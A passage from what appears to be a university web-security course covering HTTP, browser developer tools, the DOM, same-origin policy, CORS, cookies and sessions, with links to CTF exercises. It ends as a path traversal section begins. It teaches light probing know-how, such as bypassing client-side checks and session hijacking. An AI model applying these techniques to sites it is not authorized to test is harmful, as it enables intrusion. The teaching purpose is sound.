Browsers are complex pieces of machinery with many subsystems (HTML rendering, JavaScript engine, CSS parser, image parsers, etc.), and a small coding mistake in any of these systems could offer malicious code just enough of a foothold to get running.</li><li>Vulnerabilities in web application implementation - here we can talk about OWASP Top Ten vulnerabilities <a href=https://owasp.org/www-project-top-ten/>[3]</a>.</li></ul><h1 id=http-hypertext-transfer-protocol>HTTP (Hypertext Transfer Protocol)</h1><h2 id=http-request--response>HTTP Request / Response</h2><p>Communication between clients and servers is done by requests and responses:</p><ul><li>A client (a browser) sends an HTTP request to the web</li><li>An web server receives the request</li><li>The server runs an application to process the request</li><li>The server returns an HTTP response (output) to the browser</li><li>The client (the browser) receives the response</li></ul><p><img src=./assets/http-request.png alt="HTTP - Request"></p><p><img src=./assets/http-response.png alt="HTTP - Response"></p><h3 id=basic-format-of-the-request>Basic format of the request:</h3><p>VERB /resource/locator HTTP/1.1<br>Header1: Value1<br>Header2: Value2<br>…</p><body of the request><p>Header is separated from the body by 2 CRLF sequences</p><h3 id=request-headers>Request Headers:</h3><ul><li><strong>Host:</strong> Indicates the desired host handling the request</li><li><strong>Accept:</strong> Indicates what MIME type(s) are accepted by the client; often used to specify JSON or XML output for web-services</li><li><strong>Cookie:</strong> Passes cookie data to the server</li><li><strong>Referer:</strong> Page leading to this request (note: this is not passed to other servers when using HTTPS on the origin)</li><li><strong>Authorization:</strong> Used for basic auth pages (mainly). Takes the form “Basic &lt;base64’d username:password>”</li></ul><h3 id=http-request-circle>HTTP Request Circle</h3><p>A typical HTTP request / response circle:</p><ol><li>The browser requests an HTML page. The server returns an HTML file.</li><li>The browser requests a style sheet. The server returns a CSS file.</li><li>The browser requests a JPEG image. The server returns a JPG file.</li><li>The browser requests JavaScript code. The server returns a JS file</li><li>The browser requests data. The server returns data (in XML or JSON).</li></ol><h3 id=xhr---xmlhttprequest>XHR - XMLHttpRequest</h3><p>All browsers have a built-in XMLHttpRequest Object (XHR).
XHR is a JavaScript object that is used to transfer data between a web browser and a web server.
XHR is often used to request and receive data for the purpose of modifying a web page.
Despite the XML and HTTP in the name, XHR is used with other protocols than HTTP, and the data can be of many different types like HTML, CSS, XML, JSON, and plain text.</p><p>The XHR Object is a Web Developers Dream, because you can:</p><ul><li>Update a web page without reloading the page</li><li>Request data from a server - after the page has loaded</li><li>Receive data from a server - after the page has loaded</li><li>Send data to a server - in the background</li></ul><p>The XHR Object is the underlying concept of AJAX and JSON:</p><p><img src=./assets/xml_http_request.png alt=XMLHttpRequest></p><h3 id=http-response-codes>HTTP Response Codes</h3><ul><li>1xx -> Informational responses</li><li>2xx -> Successful responses</li><li>3xx -> Redirects</li><li>4xx -> Client errors</li><li>5xx -> Server errors</li></ul><p>xx = [00, 01 … 99]</p><h3 id=url-uniform-resource-locator>URL (Uniform Resource Locator)</h3><p>With Hypertext and HTTP, URL is one of the key concepts of the Web.
It is the mechanism used by browsers to retrieve any published resource on the web.</p><p>URL stands for Uniform Resource Locator.
A URL is nothing more than the address of a given unique resource on the Web.
In theory, each valid URL points to a unique resource.
Such resources can be an HTML page, a CSS document, an image, etc.
In practice, there are some exceptions, the most common being a URL pointing to a resource that no longer exists or that has moved.
As the resource represented by the URL and the URL itself are handled by the Web server, it is up to the owner of the web server to carefully manage that resource and its associated URL.</p><p>A URL incorporates the domain name, along with other detailed information, to create a complete address (or “web address”) to direct a browser to a specific page online called a web page.
In essence, it’s a set of directions and every web page has a unique one.</p><p><img src=./assets/url.png alt=URL></p><p>Special characters are encoded as hex:</p><ul><li><strong>%0A</strong> = newline</li><li><strong>%20</strong> or + = space, <strong>%2B</strong> = + (special exception)</li></ul><h1 id=browser>Browser</h1><p>A web browser (commonly referred to as a browser) is a software application for accessing the information on the World Wide Web.
When a user requests a web page from a particular website, the web browser retrieves the necessary content from a web server and then displays the page on the screen.</p><p>A list of Web Browsers: Google Chrome, Mozilla Firefox, Edge, Internet Explorer, Safari, Opera, Netscape, etc.</p><h2 id=browser-execution-model>Browser execution model</h2><p>Each browser windows or frame:</p><ul><li>Loads content</li><li>Renders it<ul><li>Processes HTML and scripts to display page</li><li>May involve images, subframes, etc.</li></ul></li><li>Responds to events such as:<ul><li>User actions: OnClick, OnMouseover</li><li>Rendering: OnLoad, OnBeforeUnload</li><li>Timing: setTimeout(), clearTimeout()</li></ul></li></ul><p><img src=./assets/browser-analogy.png alt=browser-analogy></p><p>Examples of browser vulnerabilities:</p><ul><li>Google Chrome<ul><li>CVE-2019-5795 <a href=https://nvd.nist.gov/vuln/detail/CVE-2019-5795>https://nvd.nist.gov/vuln/detail/CVE-2019-5795</a></li></ul></li><li>Mozilla Firefox<ul><li>CVE-2019-11716 <a href=https://nvd.nist.gov/vuln/detail/CVE-2019-11716>https://nvd.nist.gov/vuln/detail/CVE-2019-11716</a></li></ul></li></ul><h1 id=developer-tools>Developer Tools</h1><p>Modern browsers, such as Google Chrome, Mozilla Firefox and Microsoft Edge, include some functionality aimed at developers for easier debugging, testing and previews.
Anyone can use these tools to look at the internals of a web page.
As a security professional, or even a hobbyist, these instruments provide you with insightful information about the inner workings of any web application out there.
Even if it can only show the front-end code, it can create an overview of the structure and maybe reveal valuable details, such as the traffic sent from and received by the client.</p><p>In order to open these tools, you can press <em>F12</em> while navigating a web page in any browser mentioned, or by using <em>Mouse Right Click</em> and selecting the Inspect Element option.
The latter lets you select which part of the page should be in focus when inspected.</p><p>Alternatively, you can see the entire HTML code of a web page by selecting View Page Source in the Mouse Right Click context menu.</p><p>Next, some of the core functionalities of these tools will be detailed (some names may vary slightly across browsers, but the functionality is mainly the same, so we will focus in Google Chrome here):</p><ul><li><strong>Elements</strong>: In this tab you can see the HTML structure of the page. On the right panel, you can see the styles applied to each element when selected and add, remove or edit the properties directly from there.
This kind of inspection could lead to the discovery of hidden elements which can be toggled into view by altering the CSS code or could lead to the discovery of commented pieces of code which could contain sensitive data.
Also, the <a href=#dom-document-object-model>DOM</a> (Document Object Model) structure of the page can be altered, and elements can be added or removed, such as scripts, input fields, etc. (any element in fact), which means that any JavaScript code used to sanitize user input or perform other functions can be bypassed.</li></ul><p><img src=./assets/devtools-1.png alt="Elements - Developer Tools"></p><ul><li><strong>Console</strong>: The console prints errors which occurred during page rendering or during any action performed on the page, such as, but not limited to, error loading an image not found, error while performing an asynchronous request to fetch data, missing included file (such as CSS or Javascript files), errors in Javascript code from the included scripts, debug messages left by the developer, etc.
The console also has the ability to run any Javascript code by typing it directly there and interacting with the page.</li></ul><p><img src=./assets/devtools-2.png alt="Console - Developer Tools"></p><ul><li><strong>Sources</strong>: This tab lets you see any file loaded in the front-end, such as images, JS, CSS etc. in an arborescent way.
This could be a good tool to inspect the JS scripts included in the current page.
They could reveal possibly valuable information, such as hidden paths or resources, or even critical pieces of functionality, which, if understood, could lead to successful exploits.</li></ul><p><img src=./assets/devtools-3.png alt="Sources - Developer Tools"></p><ul><li><strong>Network</strong>: The network tab shows detailed information about every file loaded and every request and response made by the page.
You can find in-depth info about the <a href=#http-hypertext-transfer-protocol>HTTP requests</a>, such as HTTP parameters, HTTP methods (GET, POST), HTTP status codes (200, 404, 500, etc.), loading time and size of each loaded element (image, script, etc).
Furthermore, clicking on one of the requests there, you can see the headers, the preview, the response (as raw content) and others.
This is useful for listing all the resources needed by a page, such as if there are any requests to APIs, additional scripts loaded, etc.</li></ul><p><img src=./assets/devtools-4.png alt="Network - Developer Tools"></p><ul><li><strong>Application</strong>: This tab lets you see some specific data about the page, such as cookies (which will be covered in depth in the next section), local storage, session storage, cache, etc.
This can be useful to see which data is stored on the client-side and it may contain useful values.</li></ul><p><img src=./assets/devtools-5.png alt="Application - Developer Tools"></p><ul><li><strong>Security</strong>: Detailed information about the protocol used (HTTP or HTTPS) and the website certificates.
Insecure websites can be vulnerable because HTTP sends data in plain text across the connection, which may be intercepted (e.g. Man in the Middle).</li></ul><p><img src=./assets/devtools-6.png alt="Security - Developer Tools"></p><h1 id=dom-document-object-model>DOM (Document Object Model)</h1><p>The Document Object Model connects web pages to scripts or programming languages by representing the structure of a document, such as the HTML representing a web page, in memory.
Usually, that means JavaScript, although modeling HTML, SVG, or XML documents as objects are not part of the core JavaScript language, as such.</p><p>Object-oriented interface used to read and write docs</p><ul><li>Web page in HTML in structured data</li><li>DOM provides a representation of this hierarchy</li></ul><p>The DOM represents a document with a logical tree. Each branch of the tree ends in a node, and each node contains objects.
DOM methods allow programmatic access to the tree. With them, you can change the document&rsquo;s structure, style, or content.</p><p>Nodes can also have event handlers attached to them. Once an event is triggered, the event handlers get executed.
DOM is an application programming interface.
Use the DOM when we interact with web pages.</p><ul><li>Add content to a HTML document</li><li>Delete content from a HTML document</li><li>Change Content on a HTML document</li></ul><p>Every element within your document is an object: &lt;head> tag, &lt;body> tag, etc.
In javascript we can call methods on objects, we can call properties on objects in order to change the objects.</p><p><img src=./assets/dom.png alt=DOM></p><p>We can introduce nodes, all objects are nodes.
We can change the nodes, we can interact with them, create Animations, validations, etc.</p><p>The Document interface represents any web page loaded in the browser and serves as an entry point into the web page&rsquo;s content, which is the DOM tree.
The DOM tree includes elements such as body and table, among many others.
It provides functionality globally to the document, like how to obtain the page&rsquo;s URL and create new elements in the document.</p><p><strong>DOM</strong></p><ul><li>Object-oriented interface used to read and write docs</li><li>Web page in HTML is structured data</li><li>DOM provides a representation of this hierarchy</li></ul><p><strong>Examples</strong></p><ul><li>Properties: document.alinkColor, document.URL, document.forms<input disabled type=checkbox> , document.links[], document.anchors<input disabled type=checkbox></li><li>Methods: document.write(document.referrer)</li></ul><p><strong>Includes Browser Object Model (BOM)</strong></p><ul><li>window, document, frames[], history, location, navigator (type
and version of the browser)</li></ul><h1 id=mime-multipurpose-internet-mail-extensions>MIME (Multipurpose Internet Mail Extensions)</h1><p>MIME is a specification for the format of non-text e-mail attachments that allows the attachment to be sent over the Internet.
MIME allows your mail client or Web browser to send and receive things like spreadsheets and audio, video and graphics files via Internet mail.
By default, many web servers are configured to report a MIME type of text/plain or application/octet-stream for unknown content types.
As new content types are invented or added to web servers, web administrators may fail to add the new MIME types to their web server&rsquo;s configuration.
This is a major source of problems for users of Gecko-based browsers, which respect the MIME types as reported by web servers and web applications.
Here you can find an example for this type of vulnerability. <a href=https://github.com/denimgroup/denimgroup-vulnerability-examples>[4]</a></p><p><strong>MIME Sniffing</strong> - The browser will often not just look at the Content-Type header that the server is passing, but also the contents of the page.
If it looks enough like HTML, it’ll be parsed as HTML. => This led to IE 6/7-era bugs where image and text files containing HTML tags would execute as HTML (not so common anymore).</p><p><strong>Encoding Sniffing</strong> - the encoding used on a document will be sniffed by browsers.
If you don’t specify an encoding for an HTML document, the browser will apply heuristics to determine it.
If you are able to control the way the browser decodes text, you may be able to alter the parsing.</p><h1 id=security-mechanism>Security Mechanism</h1><h2 id=isolation---frames-html-sandboxing>Isolation - Frames, HTML Sandboxing</h2><h3 id=frame-and-iframe>Frame and iFrame</h3><p>Windows may contain frames from different sources</p><ul><li>Frame: rigid division as part of frameset</li><li>iFrame: floating inline frame</li></ul><p>iFrame example:</p><pre tabindex=0><code>&lt;iframe src=&#34;simple_iframe.html&#34; width=450 height=100&gt;
if you can see this, your browser doesn&#39;t understand IFRAME.
&lt;/iframe&gt;
</code></pre><p><img src=./assets/browser-security-mechanism.png alt=BrowserSecurityMechanism></p><p>Why use frames?</p><ul><li>Delegate screen area to content from another source</li><li>Browser provides isolation based on frames</li><li>Parent may work even if frame is broken</li></ul><p>In order to play a little bit with iframes follow the next instructions:</p><ol><li><code>user@hostname~$: sudo apt install nginx</code></li><li>Change <code>index.html</code> file content with the above code</li><li><code>user@hostname~$: sudo service nginx start</code></li><li>Access the browser as http://localhost</li><li>Solve the problem in order to see the iframe</li></ol><p><img src=./assets/components-browser-security-policy.png alt=ComponentsBrowserSecurityPolicy></p><h3 id=html-sandboxing>HTML Sandboxing</h3><p>The sandbox attribute enables an extra set of restrictions for the content in the iframe.</p><p>When the sandbox attribute is present, and it will:</p><ul><li>treat the content as being from a unique origin</li><li>block form submission</li><li>block script execution</li><li>disable APIs</li><li>prevent links from targeting other browsing contexts</li><li>prevent content from using plugins (through &lt;embed>, &lt;object>, &lt;applet> or others)</li><li>prevent the content to navigate its top-level browsing context</li><li>block automatically triggered features (such as automatically playing a video or automatically focusing a form control)</li></ul><p>Add the below HTML code in the same index.html as above:</p><pre tabindex=0><code>&lt;iframe src=&#34;sandbox_iframe.html&#34; sandbox width=450 height=100&gt;
if you can see this, your browser doesn&#39;t understand SANDBOX IFRAME.
&lt;/iframe&gt;
</code></pre><p>Access the page via browser http://localhost.</p><p>The value of the sandbox attribute can either be just sandbox (then all restrictions are applied), or a space-separated list of predefined values that will REMOVE the particular restrictions.</p><h1 id=same-origin-policy>Same-origin Policy</h1><p>The same-origin policy is a critical security mechanism that restricts how a document or script loaded from one origin can interact with a resource from another origin.
It helps isolate potentially malicious documents, reducing possible attack vectors.</p><p>In order to understand how the policy works, you also need to understand what is an origin.
Two URLs have the same origin if the protocol, port (if specified), and host are the same for both.
To better understand this, follow the table below:</p><table><thead><tr><th>URL</th><th>Outcome</th><th>Reason</th></tr></thead><tbody><tr><td><a href=http://store.company.com/dir2/other.html>http://store.company.com/dir2/other.html</a></td><td>Same origin</td><td>Only the path differs</td></tr><tr><td><a href=http://store.company.com/dir/inner/another.html>http://store.company.com/dir/inner/another.html</a></td><td>Same origin</td><td>Only the path differs</td></tr><tr><td><a href=https://store.company.com/page.html>https://store.company.com/page.html</a></td><td>Failure</td><td>Different protocol</td></tr><tr><td><a href=http://store.company.com:81/dir/page.html>http://store.company.com:81/dir/page.html</a></td><td>Failure</td><td>Different port (http:// is port 80 by default)</td></tr><tr><td><a href=http://news.company.com/dir/page.html>http://news.company.com/dir/page.html</a></td><td>Failure</td><td>Different host</td></tr></tbody></table><h2 id=why-is-this-important>Why is this important?</h2><p>Assume you are logged into Facebook and visit a malicious website in another browser tab.
Without the same origin policy JavaScript on that website could do anything to your Facebook account that you are allowed to do.
For example read private messages, post status updates, analyse the HTML DOM-tree after you entered your password before submitting the form.</p><p>But of course Facebook wants to use JavaScript to enhance the user experience.
So it is important that the browser can detect that this JavaScript is trusted to access Facebook resources.
That&rsquo;s where the same origin policy comes into play: If the JavaScript is included from a HTML page on facebook.com, it may access facebook.com resources.</p><p>Now replace Facebook with your online banking website, and it will be obvious that this is an issue.</p><h2 id=is-this-always-the-case-to-access-only-resources-on-the-same-origin>Is this always the case, to access only resources on the same origin?</h2><p>The most prevalent myth about Same-origin Policy is that it plainly forbids a browser to load a resource from a different origin.
Though we know that the thing that makes today&rsquo;s web technologies so rich and colorful is the content loaded from different origins.
The presence of a huge content delivery network (CDN) ecosystem proves this is not true.</p><p>Another prevalent myth is that an origin cannot send information to another one.
That is also not true.
Again we know that an origin can make a request to another one.
The information of the forms in one origin can be reached from another origin.
If we think of cloud payment systems integrated into a business workflow, these often operate by sending requests to another origin.
Even one of the most common web vulnerabilities, Cross-Site Request Forgery (CSRF), arises from that point.
CSRF is possible because of the ability of sites to make requests to each other.
This topic will be covered in a separate session more in-depth.</p><h1 id=cors>CORS</h1><p>Cross-Origin Resource Sharing (CORS) is a mechanism that uses additional HTTP headers to tell browsers to give a web application running at one origin, access to selected resources from a different origin.
A web application executes a cross-origin HTTP request when it requests a resource that has a different origin (domain, protocol, or port) from its own.</p><p>An example of a cross-origin request: the front-end JavaScript code served from <a href=https://domain-a.com>https://domain-a.com</a> uses XMLHttpRequest (AJAX) to make a request for <a href=https://domain-b.com/data.json>https://domain-b.com/data.json</a>.</p><p>For security reasons, browsers restrict cross-origin HTTP requests initiated from scripts.
For example, XMLHttpRequest follows the same-origin policy.
This means that a web application using those APIs can only request resources from the same origin the application was loaded from unless the response from other origins includes the right CORS headers.</p><p>The CORS mechanism supports secure cross-origin requests and data transfers between browsers and servers.
Modern browsers use CORS in APIs such as XMLHttpRequest to mitigate the risks of cross-origin HTTP requests.
The CORS header is added by the server to the response.</p><p><strong>CORS Header Syntax:</strong><br><code>Access-Control-Allow-Origin: *</code><br><code>Access-Control-Allow-Origin: &lt;origin></code><br><code>Access-Control-Allow-Origin: null</code><br><code>Access-Control-Allow-Origin: https://developer.mozilla.org</code></p><p><img src=./assets/CORS.jpg alt=CORS></p><h1 id=talking-to-web-sites>Talking to web sites</h1><p>Let&rsquo;s go through the basics of how HTTP requests are made, using telnet to form requests. First, let&rsquo;s connect to the vulnerable web server:</p><pre tabindex=0><code>user@hostname~#: telnet 141.85.224.157 80
</code></pre><p>Now let&rsquo;s issue a simple GET.
The request is composed of:</p><ul><li>GET <path><http-version></li><li>followed by other header contents</li><li>followed by an additional newline, indicating the end of the request.</li></ul><p><em>Please note the above bullet points and the fact that you need to provide an additional newline to indicate the end of the request.</em></p><pre tabindex=0><code>GET / HTTP/1.0
</code></pre><pre tabindex=0><code>HEAD / HTTP/1.0
</code></pre><pre tabindex=0><code>POST / HTTP/1.0
</code></pre><p>The server&rsquo;s response contains:</p><ul><li>A status code (200 OK in our case)</li><li>Date information and information about the server</li><li>Encoding and other info about the data, i.e. it&rsquo;s MIME-type</li><li>The length of the data</li><li>The actual data</li></ul><h1 id=tools>Tools</h1><h2 id=postman>Postman</h2><p>Postman is a tool through which you can send HTTP requests.
It can automate tests and integrate them into CI/CD pipeline.
You can simulate endpoints to test without having to set up a backend.
It can also monitor certain endpoints to check their health and performance. <a href=https://www.postman.com/>[6]</a></p><h2 id=httpie>HTTPie</h2><p>HTTPie is also used to send HTTP requests.
It can be used in the terminal, instead of utilities such as <strong>curl</strong> and <strong>wget</strong>.
It has an easy syntax, comes with highlighting and JSON assets. <a href=https://httpie.io/>[7]</a></p><h2 id=hoppscotch>Hoppscotch</h2><p>Hoppscotch is a tool that you can use from your browser or as a browser extension to quickly test certain endpoints.
It also supports MQTT or GraphQL requests. <a href=https://hoppscotch.io/>[8]</a></p><h1 id=further-reading>Further Reading</h1><ul><li>[1] <a href=https://skorks.com/2010/05/what-every-developer-should-know-about-urls/>https://skorks.com/2010/05/what-every-developer-should-know-about-urls/</a></li><li>[2] <a href=https://developer.mozilla.org/en-US/docs/Web/HTTP/Methods>https://developer.mozilla.org/en-US/docs/Web/HTTP/Methods</a></li><li>[3] <a href=https://owasp.org/www-project-top-ten/>https://owasp.org/www-project-top-ten/</a></li><li>[4] <a href=https://github.com/denimgroup/denimgroup-vulnerability-examples>https://github.com/denimgroup/denimgroup-vulnerability-examples</a></li><li>[5] <a href=https://portswigger.net/web-security/cors/same-origin-policy>https://portswigger.net/web-security/cors/same-origin-policy</a></li><li>[6] <a href=https://www.postman.com/>https://www.postman.com/</a></li><li>[7] <a href=https://httpie.io/>https://httpie.io/</a></li><li>[8] <a href=https://hoppscotch.io/>https://hoppscotch.io/</a></li></ul><h1 id=activities>Activities</h1><p><strong>1.</strong> The below image represents a snippet with DevTools containing information about a web application.
What can you discover in the next image ?
Is there any useful information from a security point of view ?
Write the answer to the instructor.</p><p><img src=./assets/first-activity.png alt=FirstActivity></p><p><strong>2.</strong> <a href="https://sss-ctf.security.cs.pub.ro/challenges?category=web-sessions">Cockroach</a><br><strong>3.</strong> <a href="https://sss-ctf.security.cs.pub.ro/challenges?category=web-sessions">Gimme</a><br><strong>4.</strong> <a href="https://sss-ctf.security.cs.pub.ro/challenges?category=web-sessions">Surprise</a><br><strong>5.</strong> <a href="https://sss-ctf.security.cs.pub.ro/challenges?category=web-sessions">My Special Name</a><br><strong>6.</strong> <a href="https://sss-ctf.security.cs.pub.ro/challenges?category=web-sessions">Lame Login</a><br><strong>7.</strong> <a href="https://sss-ctf.security.cs.pub.ro/challenges?category=web-sessions">Eyes</a><br><strong>8.</strong> <a href="https://sss-ctf.security.cs.pub.ro/challenges?category=web-sessions">Name</a><br><strong>9.</strong> <a href="https://sss-ctf.security.cs.pub.ro/challenges?category=web-sessions">Readme</a><br><strong>10.</strong> <a href="https://sss-ctf.security.cs.pub.ro/challenges?category=web-sessions">King-Kong</a><br><strong>11.</strong> <a href="https://sss-ctf.security.cs.pub.ro/challenges?category=web-sessions">Give to Get</a><br><strong>12.</strong> <a href="https://sss-ctf.security.cs.pub.ro/challenges?category=web-sessions">Give to Post</a><br><strong>13.</strong> <a href="https://sss-ctf.security.cs.pub.ro/challenges?category=web-sessions">One by One</a><br><strong>14.</strong> <a href="https://sss-ctf.security.cs.pub.ro/challenges?category=web-sessions">Produce-consume</a></p></div><div class=td-content style=page-break-before:always><h1 id=pg-ad6229ac83952aee3cad201564d38029>2 -</h1><h1 id=introduction>Introduction</h1><p>In order to understand how to protect a web application, you need to understand how an attacker thinks.
And in order to do that, you need to understand how a platform is built and what techniques are used to ensure minimum usability.
As a first step, you can analyze web applications using readily available tools, such as the browser’s built-in Developer Tools.
Further on, you can attempt to find more information about the basic mechanisms that enable the server to identify its clients and keep tabs on who they are (authentication) and what they are allowed to do (authorization), through the use of cookies and sessions.</p><h1 id=stateful-http-cookies>Stateful HTTP: Cookies</h1><p>As we mentioned in the previous session, HTTP is a stateless protocol used to communicate over the internet.
This means that a request is not aware of any of the previous ones, and each request is executed independently.
Given its stateless nature, simple mechanisms such as HTTP cookies were created to overcome the issue.</p><p>An HTTP cookie (also called web cookie, Internet cookie, browser cookie, or simply cookie) is a small piece of data sent from a website and stored on the user&rsquo;s computer by the user&rsquo;s web browser while the user is browsing.
Cookies were designed to be a reliable mechanism for websites to remember stateful information (such as items added in the shopping cart in an online store) or to record the user&rsquo;s browsing activity (including clicking particular buttons, logging in, or recording which pages were visited in the past).
They can also be used to remember pieces of information that the user previously entered into form fields, such as names, addresses, passwords, and credit card numbers.</p><p><img src=./assets/cookies.png alt=Cookies></p><h2 id=what-is-a-cookie>What is a cookie?</h2><p>A cookie is a <em>key=value</em> pair stored in a text file on the user’s computer.
This file can be found, for example, at the following path on a Windows 10 using Chrome:</p><p><code>C:\Users\Your User Name\AppData\Local\Google\Chrome\User Data\Default\Cookies</code></p><p>An example of cookies set for a website could be:</p><ul><li>username=admin</li><li>cookie_consent=1</li><li>theme=dark</li></ul><p>The first cookie stores the username, so it can be displayed to the user without querying the database.
The second one stores the choice made by the user regarding the cookie consent, so the application would not continue to show the message every time.
Finally, the third one stores which theme was selected (in this case, a dark theme).</p><p>Once a cookie has been set, the browser will send the cookie information in all subsequent HTTP requests until the cookie is deleted.
Additionally, the cookie can have zero or more attributes, such as:</p><ul><li><em>Domain</em> and <em>Path</em> attributes define the scope of the cookies.
These attributes tell the browser what website they belong to.</li><li><em>Same origin policy</em> dictates that websites are only allowed to set cookies on their own domain.
In other words, the <code>www.example.com</code> website is not allowed to set cookies on <code>www.test.com</code> and vice versa.
A website is only able to control cookies that are within its own domain.</li><li>The <em>Expires</em> attribute defines when the cookie is deleted.
Alternatively, the Max-Age attribute can be used to state the number of seconds after the cookie is to be deleted.</li><li>The <em>Secure</em> attribute defines that cookies should only be sent using secure channels such as HTTPS.
Cookies with the Secure attribute should only be sent through a secure connection.
This protects the application&rsquo;s cookies against theft attempts.</li><li>The <em>http-only</em> attribute defines that cookie should be exposed only using HTTP or HTTPS channels.
This means that the cookies with this attribute cannot be accessed via client-side scripting or other methods.
This is a defense mechanism against <a href=https://owasp.org/www-community/HttpOnly>some attacks</a>.</li></ul><h1 id=stateful-http-sessions>Stateful HTTP: Sessions</h1><p>As previously stated, HTTP is stateless.
Therefore, it needs a mechanism to remember information from previous requests and associate it with a user for authentication purposes.
The cookies are one way to achieve this.
However, they are considered highly insecure because the user can easily manipulate their content.
We cannot directly use them for authentication and other sensitive data.
The solution to this problem is the session, which stores the data on the server, rather than the client.
The session ID can be used as a means of communication.</p><h2 id=how-does-a-session-work>How does a session work?</h2><p>When accessing a website that uses sessions, each user is assigned a session ID.
They are more secure than the previously mentioned method mainly because the data never leaves the server, so an attacker cannot alter it.
Instead, the ID is used to uniquely identify each user and associate the respective information with them.</p><p>Sessions are usually short-lived, which makes them ideal for storing temporary states between pages.
Sessions also expire once the user closes his browser or after a predefined amount of time (for example, 30 minutes).</p><p>The basic workflow is:</p><ol><li>The server starts a new session (sets a cookie via the HTTP Cookie header).</li><li>The server sets a new session variable (stored on the server-side).</li><li>When the client changes the page, it sends all the cookies in the request, along with the session ID from step 1.</li><li>The server reads the session ID from the cookie.</li><li>The server matches the session ID with the entries of a local list (in-memory, text file etc.).</li><li>If the server finds a match, it reads the stored variables. For PHP, these variables will become available in the superglobal variable <code>$_SESSION</code>.</li><li>If the server doesn’t find a match, it will create a new session and repeat steps 1-6.</li></ol><p><img src=./assets/session.jpg alt="Session lifecycle"></p><p>Example of a session in PHP:</p><div class=highlight><pre tabindex=0 style=background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#ce5c00;font-weight:700>&lt;?</span><span style=color:#000>php</span>
</span></span><span style=display:flex><span><span style=color:#000>session_start</span><span style=color:#000;font-weight:700>();</span> <span style=color:#8f5902;font-style:italic>// Start the session
</span></span></span><span style=display:flex><span><span style=color:#8f5902;font-style:italic></span><span style=color:#000>$_SESSION</span><span style=color:#000;font-weight:700>[</span><span style=color:#4e9a06>&#39;username&#39;</span><span style=color:#000;font-weight:700>]</span> <span style=color:#ce5c00;font-weight:700>=</span> <span style=color:#4e9a06>&#34;John Doe&#34;</span><span style=color:#000;font-weight:700>;</span> 
</span></span><span style=display:flex><span><span style=color:#000>$_SESSION</span><span style=color:#000;font-weight:700>[</span><span style=color:#4e9a06>&#39;is_admin&#39;</span><span style=color:#000;font-weight:700>]</span> <span style=color:#ce5c00;font-weight:700>=</span> <span style=color:#204a87;font-weight:700>true</span><span style=color:#000;font-weight:700>;</span>
</span></span><span style=display:flex><span><span style=color:#204a87;font-weight:700>echo</span> <span style=color:#4e9a06>&#34;Hello &#34;</span> <span style=color:#ce5c00;font-weight:700>.</span> <span style=color:#000>$_SESSION</span><span style=color:#000;font-weight:700>[</span><span style=color:#4e9a06>&#39;username&#39;</span><span style=color:#000;font-weight:700>];</span>
</span></span><span style=display:flex><span><span style=color:#8f5902;font-style:italic>?&gt;</span><span style=color:#a40000>
</span></span></span></code></pre></div><p>Example of a session in Python:</p><div class=highlight><pre tabindex=0 style=background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#000>s</span> <span style=color:#ce5c00;font-weight:700>=</span> <span style=color:#000>requests</span><span style=color:#ce5c00;font-weight:700>.</span><span style=color:#000>Session</span><span style=color:#000;font-weight:700>()</span>
</span></span><span style=display:flex><span><span style=color:#000>s</span><span style=color:#ce5c00;font-weight:700>.</span><span style=color:#000>get</span><span style=color:#000;font-weight:700>(</span><span style=color:#4e9a06>&#39;https://httpbin.org/cookies/set/sessioncookie/123456789&#39;</span><span style=color:#000;font-weight:700>)</span>
</span></span><span style=display:flex><span><span style=color:#000>r</span> <span style=color:#ce5c00;font-weight:700>=</span> <span style=color:#000>s</span><span style=color:#ce5c00;font-weight:700>.</span><span style=color:#000>get</span><span style=color:#000;font-weight:700>(</span><span style=color:#4e9a06>&#39;https://httpbin.org/cookies&#39;</span><span style=color:#000;font-weight:700>)</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#204a87>print</span><span style=color:#000;font-weight:700>(</span><span style=color:#000>r</span><span style=color:#ce5c00;font-weight:700>.</span><span style=color:#000>text</span><span style=color:#000;font-weight:700>)</span>
</span></span><span style=display:flex><span><span style=color:#8f5902;font-style:italic># &#39;{&#34;cookies&#34;: {&#34;sessioncookie&#34;: &#34;123456789&#34;}}&#39;</span>
</span></span></code></pre></div><p>One might consider that sessions are pretty secure.
However, they won’t stop an attacker to intercept the cookie with the session ID, for example using a <a href=https://www.imperva.com/learn/application-security/man-in-the-middle-attack-mitm/>Man-in-the-Middle attack</a> over an insecure Wi-Fi connection, and steal the session ID to use it.
This won’t give them access to the values that are stored on the server, but they will be able to impersonate the user or perform actions on their behalf.
This is known as session hijacking.
You can read more on this subject <a href=https://owasp.org/www-community/attacks/Session_hijacking_attack>here</a> and <a href=https://www.netsparker.com/blog/web-security/session-hijacking/>here</a>.</p><h1 id=authentication-vs-authorization>Authentication vs Authorization</h1><p>Two concepts that usually make people confused are authentication and authorization.
Both terms are often used in conjunction with each other when it comes to security and gaining access to the system.
They are essential in almost every modern web application, as most of these apps need a way to uniquely identify their users using an account.
These accounts can contain both personal information, available only to the logged in user, and public information, available to anybody.
Based on the privilege level, users can have access to various functionalities, such as deleting other users, creating blog posts etc.</p><p>Fundamentally, authentication refers to <strong>who you are</strong> while authorization refers to <strong>what you can do</strong>.</p><p><strong>Authentication</strong> is the process of verifying the identity of a person or device.
A common example is entering a username and password when you log in to a website.
Entering the correct login information lets the website know who you are and that it is actually you accessing the website.</p><p>There could be other methods of authentication, such as passcodes, biometrics (fingerprints), Two-Factor Authentication, etc.
We won’t insist too much on these other methods, but it’s good to know they exist.</p><p><strong>Authorization</strong> is a security mechanism to determine access levels or user/client privileges related to system resources including files, services, computer programs, data and application features.
This is the process of granting or denying access to a network resource that allows the user access to various resources based on the user&rsquo;s identity.</p><h2 id=real-life-scenarios>Real-life scenarios</h2><p>Now imagine what would happen if someone obtains access to your Facebook account.
Besides the previously public information, such as your name and your birthday, they can now view your friend lists, private conversations, or even impersonate you through a post.
Although this situation won’t affect Facebook directly, it will certainly affect you.</p><p>What if someone were to gain access to an administrator account of a university?
They could remove all the students, erase their grades and all the study materials.
This would be a really nefarious incident that would destroy the institution’s reputation and will also affect you as a student.</p><p>This is why authentication and authorization are very important and their security is crucial.</p><h1 id=path-traversal>Path Traversal</h1><p>In many web applications, resources are accessed using a filename as a parameter.
This file is processed and displayed to the client by the application.
